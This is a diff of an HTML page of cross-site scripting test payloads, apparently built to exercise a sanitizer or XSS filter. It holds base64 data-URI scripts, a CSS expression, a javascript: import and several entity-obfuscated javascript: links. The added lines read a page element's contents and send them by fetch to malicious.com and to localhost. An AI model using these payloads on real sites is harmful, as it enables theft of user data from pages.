@@ -15,7 +15,7 @@
 	<a href="javascript:data:text/HTML;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+">ClickMe</a>
 	<a style=<!---/**/&#61expression(write(1))/*-->2</a>
 	<img src="data:text/HTML;base64,PHNjcmlwdD5hbGVydCgxMjMpPC9zY3JpcHQ+">2</a>
-	<img/src="1"/onerror="alert('XSS')">
+	<!-- <img/src="1"/onerror="alert('XSS')"> -->
 	<style>
 		@import url("javascript:alert(4)");
 	</style>
@@ -23,6 +23,14 @@
 	<!-- <body onload="alert`111`"> -->
 	<a
 		href=j&#97v&#97script&#x3A;var&#32secret&#32=&#32document.getElementsByName('name')[0]&#46innerHTML;var&#32data&#32=&#32&#123body:secret,method:'POST'};fetch`http:\//localhost:3001/api/ping?secret=something$&#123data}`>ClickMeFor$</a>
+	<a
+		href=j&#97v&#97script&#x3A;var&#32secret&#32=&#32document.getElementsByName("name")[0]&#46innerHTML;var&#32data&#32=&#32&#123body:secret,method:'POST'};fetch`https:\//malicious.com:3001/api/ping?secret=querysecret$&#123data}`>ClickMeFor$</a>
+
+	<a
+		href="j&#97vascript:var secret = document.getElementsByName('name')[0]&#46innerHTML;var data = {body:secret,method:'POST'};fetch('http:\//localhost:3001/api/ping?secret=something',data)">ClickMeFor$</a>
+
+	<a
+		href="javascript:var secret = document.getElementsByName('name')[0].innerHTML;var data = {body:secret,method:'POST'};fetch('http://localhost:3001/api/ping?secret=something',data)">ClickMeFor$</a>
 
 	<button id="b1"> click </button>
 
